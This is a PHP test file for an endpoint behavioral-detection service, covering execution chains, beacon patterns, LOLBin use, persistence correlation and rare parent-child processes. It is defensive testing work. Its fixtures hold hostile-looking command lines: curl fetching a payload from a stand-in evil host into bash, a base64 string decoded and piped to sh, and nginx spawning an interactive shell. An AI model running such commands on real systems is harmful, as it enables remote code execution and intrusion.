<?php

namespace Tests\Feature;

use App\Models\EndpointAgent;
use App\Models\EndpointBeaconPattern;
use App\Models\EndpointBehavioralFinding;
use App\Models\EndpointExecutionChain;
use App\Models\EndpointProcessSnapshot;
use App\Models\User;
use App\Services\BehavioralAnalyticsService;
use App\Services\EndpointBehavioralService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Schema;
use Tests\TestCase;

/**
 * Behavioral Detection Analytics Phase 1 — advisory-only, shadow-mode.
 * Asserts: no process kill, no host isolation, no quarantine, no autonomous response.
 */
class EndpointBehavioralAnalyticsTest extends TestCase
{
    use RefreshDatabase;

    private function admin(): User
    {
        return User::factory()->create(['role' => 'admin']);
    }

    private function makeAgent(): EndpointAgent
    {
        return EndpointAgent::factory()->create();
    }

    private function svc(): EndpointBehavioralService
    {
        return app(EndpointBehavioralService::class);
    }

    private function analytics(): BehavioralAnalyticsService
    {
        return app(BehavioralAnalyticsService::class);
    }

    private function makeSnapshot(EndpointAgent $agent, array $overrides = []): EndpointProcessSnapshot
    {
        return EndpointProcessSnapshot::create(array_merge([
            'snapshot_id'  => EndpointProcessSnapshot::generateSnapshotId(),
            'agent_id'     => $agent->id,
            'collected_at' => now(),
            'process_count'=> 0,
            'shell_count'  => 0,
            'long_lived_count' => 0,
            'suspicious_count' => 0,
            'trace_id'     => 'trace-analytics-test',
        ], $overrides));
    }

    // -----------------------------------------------------------------------
    // Schema
    // -----------------------------------------------------------------------

    public function test_behavioral_findings_table_exists(): void
    {
        $this->assertTrue(Schema::hasTable('endpoint_behavioral_findings'));
    }

    public function test_execution_chains_table_exists(): void
    {
        $this->assertTrue(Schema::hasTable('endpoint_execution_chains'));
    }

    public function test_beacon_patterns_table_exists(): void
    {
        $this->assertTrue(Schema::hasTable('endpoint_beacon_patterns'));
    }

    public function test_behavioral_findings_columns_exist(): void
    {
        foreach ([
            'finding_id', 'agent_id', 'snapshot_id', 'finding_type',
            'severity', 'confidence', 'title', 'evidence', 'trace_id', 'detected_at',
        ] as $col) {
            $this->assertTrue(
                Schema::hasColumn('endpoint_behavioral_findings', $col),
                "Missing column: {$col}"
            );
        }
    }

    // -----------------------------------------------------------------------
    // Static classifier methods (deterministic)
    // -----------------------------------------------------------------------

    public function test_lolbin_classification_correct(): void
    {
        $this->assertTrue(BehavioralAnalyticsService::isLolbin('curl'));
        $this->assertTrue(BehavioralAnalyticsService::isLolbin('wget'));
        $this->assertTrue(BehavioralAnalyticsService::isLolbin('bash'));
        $this->assertTrue(BehavioralAnalyticsService::isLolbin('base64'));
        $this->assertFalse(BehavioralAnalyticsService::isLolbin('sshd'));
        $this->assertFalse(BehavioralAnalyticsService::isLolbin('nginx'));
    }

    public function test_shell_classification_correct(): void
    {
        $this->assertTrue(BehavioralAnalyticsService::isShell('bash'));
        $this->assertTrue(BehavioralAnalyticsService::isShell('python3'));
        $this->assertTrue(BehavioralAnalyticsService::isShell('perl'));
        $this->assertFalse(BehavioralAnalyticsService::isShell('nginx'));
        $this->assertFalse(BehavioralAnalyticsService::isShell('sshd'));
    }

    public function test_downloader_classification_correct(): void
    {
        $this->assertTrue(BehavioralAnalyticsService::isDownloader('curl'));
        $this->assertTrue(BehavioralAnalyticsService::isDownloader('wget'));
        $this->assertFalse(BehavioralAnalyticsService::isDownloader('bash'));
    }

    public function test_suspicious_parent_child_detection(): void
    {
        $this->assertTrue(BehavioralAnalyticsService::isSuspiciousParentChild('nginx', 'bash'));
        $this->assertTrue(BehavioralAnalyticsService::isSuspiciousParentChild('apache2', 'python3'));
        $this->assertTrue(BehavioralAnalyticsService::isSuspiciousParentChild('mysqld', 'sh'));
        $this->assertFalse(BehavioralAnalyticsService::isSuspiciousParentChild('sshd', 'bash'));
        $this->assertFalse(BehavioralAnalyticsService::isSuspiciousParentChild('nginx', 'nginx'));
    }

    public function test_rarity_score_ordering(): void
    {
        $dbScore  = BehavioralAnalyticsService::rarityScore('mysqld');
        $webScore = BehavioralAnalyticsService::rarityScore('nginx');
        $appScore = BehavioralAnalyticsService::rarityScore('gunicorn');
        // Database parent → highest rarity
        $this->assertGreaterThan($webScore, $dbScore);
        $this->assertGreaterThan($appScore, $webScore);
    }

    public function test_rarity_score_is_deterministic(): void
    {
        $s1 = BehavioralAnalyticsService::rarityScore('nginx');
        $s2 = BehavioralAnalyticsService::rarityScore('nginx');
        $this->assertSame($s1, $s2, 'Rarity score must be deterministic');
    }

    // -----------------------------------------------------------------------
    // Execution chain detection
    // -----------------------------------------------------------------------

    public function test_execution_chain_detected_for_shell_with_downloader_parent(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        // bash (pid 200) has parent curl (pid 100)
        $processes = [
            ['pid' => 100, 'ppid' => 1,   'process_name' => 'curl',  'parent_process_name' => 'python3', 'is_shell' => false, 'command_line' => 'curl http://evil.example.com/payload.sh'],
            ['pid' => 200, 'ppid' => 100, 'process_name' => 'bash',  'parent_process_name' => 'curl',    'is_shell' => true,  'command_line' => 'bash'],
            ['pid' => 300, 'ppid' => 200, 'process_name' => 'sh',    'parent_process_name' => 'bash',    'is_shell' => true,  'command_line' => 'sh -c id'],
        ];

        $count = $this->analytics()->detectExecutionChains($agent, $snapshot, $processes, [], 'trace-chain-001');
        $this->assertGreaterThan(0, $count);

        $chains = EndpointExecutionChain::where('snapshot_id', $snapshot->id)->get();
        $this->assertNotEmpty($chains);
        $this->assertTrue((bool)$chains->first()->involves_shell);
    }

    public function test_execution_chain_score_nonnegative_and_bounded(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'curl', 'parent_process_name' => '', 'is_shell' => false, 'command_line' => 'curl x'],
            ['pid' => 2, 'ppid' => 1, 'process_name' => 'bash', 'parent_process_name' => 'curl', 'is_shell' => true, 'command_line' => 'bash'],
        ];

        $this->analytics()->detectExecutionChains($agent, $snapshot, $processes, [], 'trace-chain-score');
        $chains = EndpointExecutionChain::where('snapshot_id', $snapshot->id)->get();
        foreach ($chains as $chain) {
            $this->assertGreaterThanOrEqual(0.0, $chain->chain_score);
            $this->assertLessThanOrEqual(1.0, $chain->chain_score);
        }
    }

    public function test_short_single_process_does_not_trigger_chain(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        // Single process, no chain
        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'sshd', 'parent_process_name' => '', 'is_shell' => false, 'command_line' => 'sshd'],
        ];

        $count = $this->analytics()->detectExecutionChains($agent, $snapshot, $processes, [], 'trace-no-chain');
        $this->assertSame(0, $count);
    }

    // -----------------------------------------------------------------------
    // Beacon pattern detection
    // -----------------------------------------------------------------------

    public function test_beacon_pattern_detected_when_threshold_met(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $correlations = [];
        for ($i = 0; $i < 5; $i++) {
            $correlations[] = [
                'pid' => 1234, 'process_name' => 'curl',
                'remote_ip' => '203.0.113.10', 'remote_port' => 4444,
                'proto' => 'tcp', 'correlation_confidence' => 0.80,
            ];
        }

        $count = $this->analytics()->detectBeaconPatterns($agent, $snapshot, $correlations, 'trace-beacon-001');
        $this->assertSame(1, $count);

        $patterns = EndpointBeaconPattern::where('snapshot_id', $snapshot->id)->get();
        $this->assertCount(1, $patterns);
        $this->assertEquals(5, $patterns->first()->connection_count);
        $this->assertGreaterThan(0, $patterns->first()->destination_reuse_score);
    }

    public function test_beacon_pattern_not_emitted_below_threshold(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        // Only 2 connections — below threshold of 3
        $correlations = [
            ['pid' => 1, 'process_name' => 'curl', 'remote_ip' => '1.2.3.4', 'remote_port' => 80, 'proto' => 'tcp', 'correlation_confidence' => 0.5],
            ['pid' => 1, 'process_name' => 'curl', 'remote_ip' => '1.2.3.4', 'remote_port' => 80, 'proto' => 'tcp', 'correlation_confidence' => 0.5],
        ];

        $count = $this->analytics()->detectBeaconPatterns($agent, $snapshot, $correlations, 'trace-no-beacon');
        $this->assertSame(0, $count);
    }

    // -----------------------------------------------------------------------
    // LOLBin usage
    // -----------------------------------------------------------------------

    public function test_lolbin_finding_emitted_for_curl(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'curl', 'parent_process_name' => 'bash',
             'command_line' => 'curl -o /tmp/x http://evil.example.com', 'is_shell' => false,
             'is_long_lived' => false],
        ];

        $count = $this->analytics()->detectLolbinUsage($agent, $snapshot, $processes, [], 'trace-lolbin-001');
        $this->assertSame(1, $count);

        $findings = EndpointBehavioralFinding::where('snapshot_id', $snapshot->id)
            ->where('finding_type', EndpointBehavioralFinding::TYPE_LOLBIN_USAGE)
            ->get();
        $this->assertCount(1, $findings);
        $this->assertEquals('curl', $findings->first()->evidence['process_name'] ?? '');
    }

    public function test_lolbin_encoded_command_increases_confidence(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $base64Proc = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'bash',
             'parent_process_name' => 'python3', 'command_line' => 'bash -c "echo dGVzdA== | base64 -d | sh"',
             'is_shell' => true, 'is_long_lived' => false],
        ];
        $plainProc = [
            ['pid' => 2, 'ppid' => 0, 'process_name' => 'bash',
             'parent_process_name' => 'sshd', 'command_line' => 'bash -l',
             'is_shell' => true, 'is_long_lived' => false],
        ];

        $snapshotBase64 = $this->makeSnapshot($agent, ['snapshot_id' => EndpointProcessSnapshot::generateSnapshotId()]);
        $snapshotPlain  = $this->makeSnapshot($agent, ['snapshot_id' => EndpointProcessSnapshot::generateSnapshotId()]);

        $this->analytics()->detectLolbinUsage($agent, $snapshotBase64, $base64Proc, [], 'trace-b64');
        $this->analytics()->detectLolbinUsage($agent, $snapshotPlain, $plainProc, [], 'trace-plain');

        $b64Finding   = EndpointBehavioralFinding::where('snapshot_id', $snapshotBase64->id)->first();
        $plainFinding = EndpointBehavioralFinding::where('snapshot_id', $snapshotPlain->id)->first();

        $this->assertNotNull($b64Finding);
        $this->assertNotNull($plainFinding);
        $this->assertGreaterThan($plainFinding->confidence, $b64Finding->confidence,
            'Base64 encoded command must increase confidence score');
    }

    // -----------------------------------------------------------------------
    // Persistence correlation
    // -----------------------------------------------------------------------

    public function test_persistence_correlation_detected(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'bash', 'parent_process_name' => 'sshd',
             'is_shell' => true, 'command_line' => 'bash'],
        ];
        $persistenceItems = [
            ['item_type' => 'systemd_service', 'item_key' => 'evil.service',
             'item_name' => 'evil', 'item_path' => '/etc/systemd/system/evil.service', 'is_new' => true],
        ];
        $correlations = [
            ['pid' => 1, 'process_name' => 'bash', 'remote_ip' => '203.0.113.5', 'remote_port' => 4444,
             'proto' => 'tcp', 'correlation_confidence' => 0.85],
        ];

        $count = $this->analytics()->detectPersistenceCorrelation(
            $agent, $snapshot, $processes, $persistenceItems, $correlations, 'trace-persist-corr'
        );
        $this->assertSame(1, $count);

        $finding = EndpointBehavioralFinding::where('snapshot_id', $snapshot->id)
            ->where('finding_type', EndpointBehavioralFinding::TYPE_PERSISTENCE_CORRELATION)
            ->first();
        $this->assertNotNull($finding);
        $this->assertContains('evil', $finding->evidence['persistence_items'] ?? []);
    }

    public function test_persistence_correlation_not_emitted_without_outbound(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes        = [['pid' => 1, 'ppid' => 0, 'process_name' => 'bash', 'parent_process_name' => 'sshd', 'is_shell' => true, 'command_line' => 'bash']];
        $persistenceItems = [['item_type' => 'cron_job', 'item_key' => 'cron:/etc/cron.d/test', 'item_name' => 'test', 'item_path' => '/etc/cron.d/test', 'is_new' => false]];

        $count = $this->analytics()->detectPersistenceCorrelation(
            $agent, $snapshot, $processes, $persistenceItems, [], 'trace-no-outbound'
        );
        $this->assertSame(0, $count);
    }

    // -----------------------------------------------------------------------
    // Rare parent-child
    // -----------------------------------------------------------------------

    public function test_rare_parent_child_detected_for_nginx_bash(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes = [
            ['pid' => 100, 'ppid' => 1, 'process_name' => 'nginx', 'parent_process_name' => 'init', 'is_shell' => false, 'command_line' => 'nginx'],
            ['pid' => 200, 'ppid' => 100, 'process_name' => 'bash', 'parent_process_name' => 'nginx', 'is_shell' => true,  'command_line' => 'bash -i'],
        ];

        $count = $this->analytics()->detectRareParentChild($agent, $snapshot, $processes, 'trace-rare-001');
        $this->assertGreaterThan(0, $count);

        $finding = EndpointBehavioralFinding::where('snapshot_id', $snapshot->id)
            ->where('finding_type', EndpointBehavioralFinding::TYPE_RARE_PARENT_CHILD)
            ->first();
        $this->assertNotNull($finding);
        $this->assertEquals('nginx', $finding->evidence['parent_process'] ?? '');
        $this->assertEquals('bash',  $finding->evidence['child_process']  ?? '');
    }

    public function test_rare_parent_child_rarity_score_in_evidence(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);

        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'mysqld', 'parent_process_name' => 'init', 'is_shell' => false, 'command_line' => 'mysqld'],
            ['pid' => 2, 'ppid' => 1, 'process_name' => 'bash',   'parent_process_name' => 'mysqld', 'is_shell' => true,  'command_line' => 'bash'],
        ];

        $this->analytics()->detectRareParentChild($agent, $snapshot, $processes, 'trace-rarity');
        $finding = EndpointBehavioralFinding::where('snapshot_id', $snapshot->id)->first();
        $this->assertNotNull($finding);
        $this->assertArrayHasKey('rarity_score', $finding->evidence ?? []);
        $this->assertGreaterThan(0.80, $finding->evidence['rarity_score']); // mysqld = 0.90
    }

    // -----------------------------------------------------------------------
    // Full analyzeSnapshot integration
    // -----------------------------------------------------------------------

    public function test_analyze_snapshot_called_on_store(): void
    {
        $agent = $this->makeAgent();
        $payload = [
            'agent_id'    => $agent->agent_id,
            'trace_id'    => 'trace-integrate-001',
            'collected_at'=> now()->toIso8601String(),
            'processes'   => [
                ['pid' => 1, 'ppid' => 0, 'process_name' => 'nginx',   'parent_process_name' => 'init',  'is_shell' => false, 'command_line' => 'nginx'],
                ['pid' => 2, 'ppid' => 1, 'process_name' => 'bash',    'parent_process_name' => 'nginx', 'is_shell' => true,  'command_line' => 'bash -i',
                 'duration_seconds' => 100, 'is_long_lived' => false, 'is_suspicious' => true,
                 'first_seen_at' => null, 'last_seen_at' => null, 'user' => 'www-data', 'session_id' => null,
                 'executable_path' => '/bin/bash', 'ppid' => 1],
            ],
            'persistence_items'   => [],
            'network_correlations'=> [],
        ];

        $this->svc()->storeSnapshot($agent, $payload, 'trace-integrate-001');

        // At least the rare_parent_child finding should have been created
        $findings = EndpointBehavioralFinding::where('agent_id', $agent->id)->get();
        $this->assertNotEmpty($findings, 'analyzeSnapshot must generate findings for nginx→bash');
    }

    public function test_trace_id_propagated_to_findings(): void
    {
        $agent    = $this->makeAgent();
        $snapshot = $this->makeSnapshot($agent);
        $processes = [
            ['pid' => 1, 'ppid' => 0, 'process_name' => 'curl', 'parent_process_name' => 'bash',
             'command_line' => 'curl x', 'is_shell' => false, 'is_long_lived' => false],
        ];

        $this->analytics()->detectLolbinUsage($agent, $snapshot, $processes, [], 'trace-propagate-001');

        $finding = EndpointBehavioralFinding::where('snapshot_id', $snapshot->id)->first();
        $this->assertEquals('trace-propagate-001', $finding->trace_id);
    }

    // -----------------------------------------------------------------------
    // Shadow-only enforcement
    // -----------------------------------------------------------------------

    public function test_finding_type_constants_are_shadow_advisory(): void
    {
        $types = [
            EndpointBehavioralFinding::TYPE_EXECUTION_CHAIN,
            EndpointBehavioralFinding::TYPE_BEACON_PATTERN,
            EndpointBehavioralFinding::TYPE_LOLBIN_USAGE,
            EndpointBehavioralFinding::TYPE_PERSISTENCE_CORRELATION,
            EndpointBehavioralFinding::TYPE_RARE_PARENT_CHILD,
        ];
        // Advisory types must NOT include 'kill', 'isolate', 'quarantine', 'block'
        foreach ($types as $type) {
            $this->assertStringNotContainsString('kill',      $type);
            $this->assertStringNotContainsString('isolate',   $type);
            $this->assertStringNotContainsString('quarantine',$type);
            $this->assertStringNotContainsString('block',     $type);
        }
    }

    public function test_no_process_kill_in_analytics_service(): void
    {
        $src = file_get_contents(app_path('Services/BehavioralAnalyticsService.php'));
        $forbidden = ['proc_kill', 'posix_kill', 'exec("kill', 'system("kill'];
        foreach ($forbidden as $pattern) {
            $this->assertStringNotContainsString($pattern, $src,
                "Forbidden pattern found in analytics service: {$pattern}");
        }
    }

    public function test_no_host_isolation_in_analytics_service(): void
    {
        $src = file_get_contents(app_path('Services/BehavioralAnalyticsService.php'));
        foreach (['iptables', 'isolate_host', 'netfilter', 'nftables'] as $pattern) {
            $this->assertStringNotContainsString($pattern, $src,
                "Isolation implementation found in analytics: {$pattern}");
        }
    }

    // -----------------------------------------------------------------------
    // UI access
    // -----------------------------------------------------------------------

    public function test_analytics_dashboard_requires_auth(): void
    {
        $agent = $this->makeAgent();
        $this->get("/endpoint-agents/{$agent->agent_id}/analytics")->assertRedirect('/login');
    }

    public function test_analytics_dashboard_accessible_to_admin(): void
    {
        $agent = $this->makeAgent();
        $this->actingAs($this->admin())
             ->get("/endpoint-agents/{$agent->agent_id}/analytics")
             ->assertStatus(200);
    }

    public function test_execution_chain_view_accessible(): void
    {
        $agent = $this->makeAgent();
        $this->actingAs($this->admin())
             ->get("/endpoint-agents/{$agent->agent_id}/analytics/chains")
             ->assertStatus(200);
    }

    public function test_beacon_view_accessible(): void
    {
        $agent = $this->makeAgent();
        $this->actingAs($this->admin())
             ->get("/endpoint-agents/{$agent->agent_id}/analytics/beacon")
             ->assertStatus(200);
    }

    public function test_rare_parent_child_view_accessible(): void
    {
        $agent = $this->makeAgent();
        $this->actingAs($this->admin())
             ->get("/endpoint-agents/{$agent->agent_id}/analytics/rare-parent-child")
             ->assertStatus(200);
    }

    public function test_persistence_correlation_view_accessible(): void
    {
        $agent = $this->makeAgent();
        $this->actingAs($this->admin())
             ->get("/endpoint-agents/{$agent->agent_id}/analytics/persistence-correlation")
             ->assertStatus(200);
    }
}
